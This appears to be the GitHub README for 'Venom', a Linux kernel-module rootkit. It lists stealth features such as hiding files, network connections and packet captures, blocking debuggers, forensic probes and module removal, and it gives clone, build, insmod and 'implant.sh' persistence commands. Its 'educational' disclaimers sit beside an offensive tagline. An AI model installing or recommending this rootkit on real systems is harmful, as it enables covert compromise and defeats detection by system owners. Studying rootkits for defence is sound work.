<div align="center"> 
  <img src="https://i.postimg.cc/wBzfJZYW/venom.png" alt="banner" style="max-width:100%; border-radius:12px;"/> 
</div>

<h1 align="center">Venom</h1>

<div align="center">
  <strong>A poison that sleeps in the kernel’s veins</strong><br>
  <b><i>A Linux Kernel Module</i></b> 
  <br><br>
  <img alt="Venom Ascendancy" src="https://img.shields.io/static/v1?label=Venom&message=Ascendancy&labelColor=000000&color=FFFFFF&style=for-the-badge&logo=linux&logoColor=ff66cc">
  <img alt="Platform" src="https://img.shields.io/static/v1?label=Platform&message=Linux&labelColor=000000&color=FFFFFF&style=for-the-badge&logo=linux&logoColor=ff66cc">
  <img alt="Language" src="https://img.shields.io/static/v1?label=Made%20in&message=C&labelColor=000000&color=FFFFFF&style=for-the-badge&logo=c&logoColor=ff66cc">
  <img alt="Architecture" src="https://img.shields.io/static/v1?label=x64&message=Supported&labelColor=000000&color=FFFFFF&style=for-the-badge&logo=amd&logoColor=ff66cc">
  <img alt="Status" src="https://img.shields.io/static/v1?label=Tested&message=True&labelColor=000000&color=FFFFFF&style=for-the-badge&logo=checkmarx&logoColor=ff66cc">
</div>

--- 

> [!Important]
> Venom — An advance loadable kernel module, strictly for educational purposes only. 


## Features

* **Output interception** — watches kernel write paths to protect or hide tracing/logs.
* **Input interception** — inspects reads to stop leaks of Venom internals.
* **Dir filtering (64-bit)** — hides files/dirs from normal `ls`/readdir views.
* **Dir filtering (32-bit/compat)** — same as above for 32-bit compatibility calls.
* **Module load control** — watches/blocks module insertions to stop rivals.
* **FD-based module load** — monitors modern (fd) module loads the same way.
* **Module unload protection** — prevents or logs attempts to remove modules.
* **Signal control** — intercepts signals to stop forced kills or meddling.
* **Device/ioctl protection** — blocks/inspects ioctl probes from forensic tools.
* **TCP /proc hooks** — filters `/proc/net/tcp` and `/proc/net/tcp6` to hide endpoints.
* **UDP /proc hooks** — filters `/proc/net/udp` and `/proc/net/udp6`.
* **Packet receive interception** — filters raw packet capture paths (AF_PACKET/TPACKET).
* **Mount blocking** — denies unwanted mounts/moves to keep things hidden.
* **FS protection hooks** — hooks `openat`/`renameat`/`unlinkat` to guard critical files.
* **Socket logging** — logs new sockets (watch outbound channels).
* **Blocks `ptrace` and `prctl`** — anti-debugging
* **process_vm_readv / process_vm_writev monitoring** — observe inter-process memory read/write attempts
* **Hides metadata** - metadata of the files will not be shown to protect the rootkit
* **Log Commands** - Log if any command, binary or file is not safe to run


## Installation


```bash
# Insert the module
git clone https://github.com/Trevohack/Venom
cd Venom
make
insmod venom.ko

# Install with advance persistence
git clone https://github.com/Trevohack/Venom
cd Venom
chmod +x implant.sh
./implant.sh
```

- And let the venom spread 

<img width="1149" height="563" alt="Screenshot 2025-10-05 091005" src="https://github.com/user-attachments/assets/484549a0-43c1-48af-9abc-0f10170ddf7d" />



## 📚 Documentation

The `docs` folder contains the project's design and reference material. Quick links:

- [Syscall Hooks (overview)](./docs/syscalls.md) — which hooks are monitored and why (non-operational)  
- [Diagrams](./docs) — Flow and structure diagrams
- [Detection](./docs/detection) — defensive signals, suggested audit checks, and safe test advice

Browse the docs: [docs](./docs)


## Finishing Touches

Venom is not a weapon it’s a **research & educational project**.  

✔️ **Stay Responsible**  
Use this content only in safe, legal environments you fully control 

✔️ **Contribute for Good**  
Pull requests that improve documentation, defensive detection notes, or historical references are welcome. Contributions must follow the spirit of responsible research **no weaponized code, no operational exploits.**

✔️ **Respect the Ecosystem**  
This repo is about knowledge-sharing, not misuse. Always respect the boundaries of ethical hacking and your local laws. When in doubt, **don’t run it on production systems**.

## References & Special Thanks

- [Diamorphine](https://github.com/m0nad/Diamorphine) - old kit but greatest inspiration
- [TheXcellerator](https://xcellerator.github.io/posts/linux_rootkits_01/) - learnt about LKMs first, mad respect
- [MatheuZSecurity](https://github.com/MatheuZSecurity) - inspiration, huge shout out
- [Kvoid](https://github.com/carloslack/KoviD) - Goat


---

> **Closing note:**  
> Spread the venom. Leave no trace. Own the silence. 

--- 
